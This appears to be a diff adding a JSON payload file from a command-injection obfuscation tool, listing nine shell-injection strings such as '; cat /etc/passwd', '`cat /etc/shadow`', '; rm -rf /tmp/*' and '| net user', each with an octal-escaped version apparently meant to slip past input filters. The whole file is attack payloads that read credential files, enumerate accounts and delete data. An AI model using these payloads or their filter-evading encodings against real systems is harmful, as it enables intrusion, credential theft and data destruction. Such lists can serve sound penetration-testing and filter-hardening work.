@@ -1,0 +1,56 @@
+{
+  "payload_1": {
+    "original": "; cat /etc/passwd",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\073\\040\\143\\141\\164\\040\\057\\145\\164\\143\\057\\160\\141\\163\\163\\167\\144"
+  },
+  "payload_2": {
+    "original": "| whoami",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\174\\040\\167\\150\\157\\141\\155\\151"
+  },
+  "payload_3": {
+    "original": "&& ls -la",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\046\\046\\040\\154\\163\\040\\055\\154\\141"
+  },
+  "payload_4": {
+    "original": "`cat /etc/shadow`",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\140\\143\\141\\164\\040\\057\\145\\164\\143\\057\\163\\150\\141\\144\\157\\167\\140"
+  },
+  "payload_5": {
+    "original": "$(id)",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\044\\050\\151\\144\\051"
+  },
+  "payload_6": {
+    "original": "; rm -rf /tmp/*",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\073\\040\\162\\155\\040\\055\\162\\146\\040\\057\\164\\155\\160\\057\\052"
+  },
+  "payload_7": {
+    "original": "| net user",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\174\\040\\156\\145\\164\\040\\165\\163\\145\\162"
+  },
+  "payload_8": {
+    "original": "&& dir C:",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\046\\046\\040\\144\\151\\162\\040\\103\\072"
+  },
+  "payload_9": {
+    "original": "`ping -c 5 127.0.0.1`",
+    "template": "command_injection",
+    "method": "octal",
+    "transmuted": "\\140\\160\\151\\156\\147\\040\\055\\143\\040\\065\\040\\061\\062\\067\\056\\060\\056\\060\\056\\061\\140"
+  }
+}
